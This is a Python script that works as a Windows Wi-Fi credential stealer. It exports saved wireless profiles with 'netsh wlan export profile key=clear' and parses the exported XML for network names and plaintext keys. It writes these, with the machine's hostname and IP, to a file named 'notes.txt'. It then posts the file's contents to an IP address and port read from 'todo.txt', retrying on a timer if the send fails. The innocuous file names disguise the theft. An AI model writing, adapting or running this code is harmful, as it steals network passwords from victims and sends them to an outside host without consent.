import subprocess
import os
import requests
import json
import threading
import socket


password_file = open("notes.txt", "w", encoding="utf-8")
password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
password_file.close()

files = []
ssid = []
password = []

subprocess.run("netsh wlan export profile key=clear", capture_output = True).stdout.decode()
#os.system("netsh wlan export profile key=clear")

path = os.getcwd()

try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        ip_address = lines[0].strip()
        interval = int(lines[1])
        port = lines[2]
        f.close()
except:
    pass


def send():
    try:
        with open("notes.txt", "r") as f:
            payload = json.dumps({"content": f.read()})
            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
        return
    except:
        timer = threading.Timer(interval, send)
        timer.start()

def getFiles():
    for file_name in os.listdir(path):
        if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
            files.append(file_name)

getFiles()

with open("notes.txt", "a", encoding="utf-8") as file:
    written_ssids = set()
    for i in files:
        with open(i, "r") as f:
            for line in f.readlines():
                if "name" in line:
                    stripped = line.strip()
                    front = stripped[6:]
                    back = front[:-7]
                    if back not in written_ssids:
                        ssid.append(back)
                if "keyMaterial" in line:
                    stripped = line.strip()
                    front = stripped[13:]
                    back = front[:-14]
                    if ssid and back and ssid[-1] not in written_ssids:  # only write the last SSID if it hasn't been written yet
                        written_ssids.add(ssid[-1])
                        password.append(back)
                        file.write(f"SSID: {ssid[-1]} Password: {password[-1]}\n")

send()
